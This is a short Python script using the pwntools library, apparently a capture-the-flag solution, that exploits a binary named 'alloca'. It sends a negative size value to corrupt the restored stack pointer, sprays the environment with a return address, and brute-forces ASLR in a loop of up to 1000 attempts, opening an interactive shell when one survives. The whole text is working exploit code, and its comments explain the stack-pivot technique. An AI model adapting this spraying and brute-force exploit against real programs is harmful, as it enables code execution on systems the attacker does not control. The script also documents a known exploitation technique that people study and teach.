#!/usr/bin/python

# An addr for main() base stack frame is restored via:
#
# 0x08048835 <+466>: lea    esp,[ecx-0x4]
#
# We're going to override [ecx-0x4] with 'blind' address
# to sprayed stack region. About 1.5 bytes to bruteforce by ASLR.

import numpy
from pwn import *
context.log_level = 'error'

ret = str(numpy.int32(0xffce0000))
spray_env = p32(0x80485ab) * 0x1000
envv = {str(i):spray_env for i in range(120)}

for i in range(1000):
    print i
    t = process('/home/alloca/alloca', env=envv)
    t.sendline(str('-72'))
    t.sendline(ret)
    sleep(3.5)
    if t.poll() is None:
        t.interactive()
    t.kill()
